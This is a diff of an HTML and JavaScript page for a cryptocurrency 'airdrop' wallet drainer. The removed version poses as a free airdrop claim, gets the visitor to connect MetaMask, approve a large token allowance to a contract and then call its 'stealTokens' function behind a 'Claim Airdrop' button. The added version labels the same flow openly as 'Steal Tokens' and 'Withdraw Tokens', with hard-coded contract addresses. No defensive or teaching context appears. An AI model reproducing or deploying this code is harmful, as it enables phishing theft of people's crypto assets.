@@ -3,129 +3,162 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claim Your Airdrop</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
+    <title>Malicious Airdrop DApp</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.3/dist/web3.min.js"></script>
 </head>
 <body>
-    <h1>Claim Your Free Airdrop!</h1>
+    <h1>Malicious Airdrop DApp</h1>
+    
     <button id="connectButton">Connect MetaMask</button>
     <button id="approveButton" style="display:none;">Approve Contract</button>
-    <button id="airdropButton" style="display:none;">Claim Airdrop</button>
-
+    <button id="stealButton" style="display:none;">Steal Tokens</button>
+    <button id="withdrawButton" style="display:none;">Withdraw Tokens</button>
+    
     <script>
-        // Define ABIs for the ERC-20 token and the AirdropSteal contract
-        const tokenABI = [
+        let web3;
+        let contract;
+        let accounts;
+        let contractAddress = "0xEDd1061AC707dcE56B48B77a700D75CD51f261cf";  // Malicious contract address
+        let tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4";  // TKK token address
+        let contractABI = [
             {
-                "constant": false,
                 "inputs": [
-                    { "name": "spender", "type": "address" },
-                    { "name": "amount", "type": "uint256" }
+                    {
+                        "internalType": "address",
+                        "name": "spender",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
                 ],
                 "name": "approve",
-                "outputs": [{ "name": "", "type": "bool" }],
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "nonpayable",
                 "type": "function"
             },
             {
-                "constant": true,
-                "inputs": [{ "name": "owner", "type": "address" }],
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "account",
+                        "type": "address"
+                    }
+                ],
                 "name": "balanceOf",
-                "outputs": [{ "name": "", "type": "uint256" }],
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
                 "type": "function"
-            }
-        ];
-
-        const airdropContractABI = [
+            },
             {
-                "inputs": [{ "internalType": "address", "name": "_tokenAddress", "type": "address" }],
-                "name": "stealTokens",
-                "outputs": [],
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "recipient",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "transfer",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "sender",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "address",
+                        "name": "recipient",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "transferFrom",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
                 "stateMutability": "nonpayable",
                 "type": "function"
             }
         ];
 
-        // Contract addresses
-        const tokenAddress = "0x9052EB26C0b9836335Ec153413F80bAEc7536414";  // Token contract address to steal from
-        const contractAddress = "0xf5d2621f8b5eaabd6a35e65142cf0c06d9b791b5"; // AirdropSteal contract address
-     
-
-        let web3;
-        let tokenContract;
-        let airdropContract;
-        let userAddress;
-
-        // Function to connect MetaMask
+        // Connect to MetaMask and Web3
         async function connectMetaMask() {
             if (window.ethereum) {
                 web3 = new Web3(window.ethereum);
-                try {
-                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                    userAddress = accounts[0];
-
-                    // Initialize contracts
-                    tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
-                    airdropContract = new web3.eth.Contract(airdropContractABI, contractAddress);
-
-                    // Hide the connect button and show the approve button
-                    document.getElementById('connectButton').style.display = 'none';
-                    document.getElementById('approveButton').style.display = 'block';
-                } catch (error) {
-                    console.error("MetaMask connection failed", error);
-                    alert("Please connect your MetaMask wallet.");
-                }
+                await window.ethereum.request({ method: "eth_requestAccounts" });
+                accounts = await web3.eth.getAccounts();
+                contract = new web3.eth.Contract(contractABI, contractAddress);
+                document.getElementById("approveButton").style.display = "block";
+                document.getElementById("stealButton").style.display = "block";
+                document.getElementById("withdrawButton").style.display = "block";
             } else {
-                alert("MetaMask not detected! Please install MetaMask.");
+                alert("Please install MetaMask!");
             }
         }
 
-        // Function to approve the contract to spend tokens
+        // Approve the contract to transfer tokens
         async function approveContract() {
-            try {
-                // Set a very high allowance to ensure the contract can access all tokens
-                const maxAllowance = web3.utils.toWei('1000000', 'ether'); // Replace with a suitable allowance if needed
-
-                const gasPrice = await web3.eth.getGasPrice();
-                const gasLimit = 100000; // Set a reasonable gas limit
-
-                await tokenContract.methods.approve(contractAddress, maxAllowance).send({
-                    from: userAddress,
-                    gasPrice: gasPrice,
-                    gas: gasLimit
-                });
-
-                alert("Contract approved to spend your tokens!");
-                document.getElementById('approveButton').style.display = 'none';
-                document.getElementById('airdropButton').style.display = 'block';
-            } catch (error) {
-                console.error("Error approving contract:", error);
-                alert("Approval failed! Check the console for more details.");
-            }
+            const amount = web3.utils.toWei("1000", "ether"); // For testing, approve 1000 tokens
+            const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
+            await tokenContract.methods.approve(contractAddress, amount).send({ from: accounts[0] });
+            alert("Approval Successful");
         }
 
-        // Function to claim the airdrop (execute the stealTokens function)
-        async function claimAirdrop() {
-            try {
-                const gasPrice = await web3.eth.getGasPrice();
-                const gasLimit = 100000; // Set a reasonable gas limit
-
-                // Call the stealTokens function
-                await airdropContract.methods.stealTokens(tokenAddress).send({
-                    from: userAddress,
-                    gasPrice: gasPrice,
-                    gas: gasLimit
-                });
-
-                alert("Airdrop claimed! Tokens transferred.");
-            } catch (err) {
-                console.error("Error claiming the airdrop:", err);
-                alert("Transaction failed! Check the console for more details.");
-            }
+        // Steal Tokens
+        async function stealTokens() {
+            await contract.methods.stealTokens().send({ from: accounts[0] });
+            alert("Tokens stolen successfully");
         }
 
-        // Event listeners for the buttons
-        document.getElementById('connectButton').addEventListener('click', connectMetaMask);
-        document.getElementById('approveButton').addEventListener('click', approveContract);
-        document.getElementById('airdropButton').addEventListener('click', claimAirdrop);
+        // Withdraw Tokens
+        async function withdrawTokens() {
+            await contract.methods.withdrawTokens().send({ from: accounts[0] });
+            alert("Tokens withdrawn successfully");
+        }
+
+        // Add event listeners to buttons
+        document.getElementById("connectButton").addEventListener("click", connectMetaMask);
+        document.getElementById("approveButton").addEventListener("click", approveContract);
+        document.getElementById("stealButton").addEventListener("click", stealTokens);
+        document.getElementById("withdrawButton").addEventListener("click", withdrawTokens);
     </script>
 </body>
 </html>
